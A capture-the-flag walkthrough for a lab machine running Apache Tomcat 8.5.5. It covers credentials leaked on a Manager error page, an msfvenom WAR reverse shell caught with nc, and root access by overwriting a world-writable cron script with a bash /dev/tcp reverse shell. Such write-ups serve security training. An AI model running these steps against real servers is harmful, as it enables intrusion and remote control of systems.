1. Reconnaissance

I began with an Nmap scan:

<img width="773" height="334" alt="image" src="https://github.com/user-attachments/assets/b2b30f25-4934-4050-8551-aa8014238a67" />

Open ports:

22 – SSH
8009 – AJP (Apache JServ Protocol)
8080 – Apache Tomcat 8.5.5

**Analysis**
- Port 8080 exposed Apache Tomcat 8.5.5
- /manager is commonly exposed in misconfigured Tomcat deployments
- AJP (8009) was noted but not needed for exploitation

2. Web Enumeration

<img width="671" height="391" alt="image" src="https://github.com/user-attachments/assets/7ef21ec7-f0d4-4c7e-a2c9-bfaf68e95ac2" />

This revealed:

- /manager

3. Tomcat Manager Credential Disclosure

After entering random credentials, the error page revealed valid credentials for:

- /manager/html

<img width="1285" height="434" alt="image" src="https://github.com/user-attachments/assets/3a6ee706-5414-4fdb-b495-e3d47b1801c2" />

Using the disclosed credentials, I successfully accessed the Tomcat Manager dashboard.

4. WAR File Upload → Remote Code Execution

Inside /manager/html, I observed that WAR file uploads were permitted.

Tomcat Manager allows application deployment by design. If authenticated, this results in code execution.

Creating Reverse Shell WAR

I generated a WAR reverse shell using:
- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=1234 -f war -o shell.war

Started a listener:
- nc -lvnp 1234

Uploaded shell.war via the Tomcat Manager interface.

<img width="1906" height="462" alt="image" src="https://github.com/user-attachments/assets/52aa157d-c56b-4a0d-babc-41593e97016b" />

After deployment, I navigated to the shell I uploaded. This triggered a reverse shell.

<img width="524" height="64" alt="image" src="https://github.com/user-attachments/assets/5e31967f-b869-47c7-a62e-12b4d1ca1c73" />

5. User Flag

After gaining a shell, I stabilised it:
- python3 -c 'import pty; pty.spawn("/bin/bash")'

Navigated to:
- cd /home/jack

Found:
- user.txt

Successfully retrieved the user flag.

<img width="316" height="54" alt="image" src="https://github.com/user-attachments/assets/989ae4b2-4491-41ac-bda4-563f67076759" />

6. Privilege Escalation

While enumerating the system, I found a file in /home/jack:

- id.sh

Contents:

**#!/bin/bash
id > test.txt**

**Analysis**
- The script runs id and writes output to a file.
- File permissions showed it was writable to all users.

<img width="537" height="260" alt="image" src="https://github.com/user-attachments/assets/764f0477-4e48-437b-873d-91c499812a90" />

7. Cronjob Discovery

Running LinPEAS:
- ./linpeas.sh

Revealed:
- id.sh was executed by a cronjob
- It was running as root

This is a critical privilege escalation vector:

- World-writable script
- Executed as root via cron

<img width="818" height="174" alt="image" src="https://github.com/user-attachments/assets/74cd8904-7faa-4208-b8f9-2e716afcb6bd" />

8. Exploiting the Cronjob

I replaced the contents of id.sh with a reverse shell:

- echo 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1' > id.sh

Started a listener again:
- nc -lvnp 1234

Waited for the cronjob to execute (approximately 1 minute).

The reverse shell connected back as:
- root
  
With this shell, I was able to reteieve the root flag to complete the CTF.

<img width="645" height="165" alt="image" src="https://github.com/user-attachments/assets/46d3644b-b60d-4dd0-bf76-8bfd3d60c2fc" />
